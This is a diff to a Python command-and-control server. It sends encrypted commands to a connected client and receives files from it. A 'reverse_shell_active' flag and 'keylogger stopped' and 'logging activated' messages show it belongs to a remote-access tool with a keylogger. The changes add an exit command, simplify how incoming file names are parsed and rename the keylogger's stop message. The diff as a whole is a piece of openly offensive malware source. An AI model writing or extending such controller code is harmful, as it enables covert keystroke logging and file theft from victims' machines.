@@ -33,6 +33,10 @@ while True:
     if inpt:
         if inpt == "help":
             print_usage()
+            
+        elif inpt == "exit" and not reverse_shell_active:
+            print("stopping server")
+            break
         else:
             conn.sendall(utils.encrypt(inpt.encode(utils.ENCODING)))
 
@@ -41,17 +45,19 @@ while True:
                 msg = recv.decode(utils.ENCODING)
 
                 if msg.startswith("file__"):
-                    filename, dtype, length = msg.split("__")[1:4]
+                    filename, length = msg.split("__")[1:3]
+                    
+                    print("Receiving File:", filename, "length:", length)
                     data = b""
                     while recv != "done sending file".encode(utils.ENCODING):
                         recv = utils.decrypt(conn.recv(utils.BUFFSIZE))
                         if recv:
                             data += recv
-                    print("while end")
-                    utils.convert_bytes_to_file(data=data, filename=filename+"."+dtype, path=".")
+                    print("Data received")
+                    utils.convert_bytes_to_file(data=data, filename=filename, path=".")
                     
-                elif msg == "terminated":
-                    print("terminated client. Good bye!")
+                elif msg == "keylogger stopped":
+                    print("keylogger stopped. good bye!")
                     break
                 elif msg == "logging activated":
                     print("logging activated")
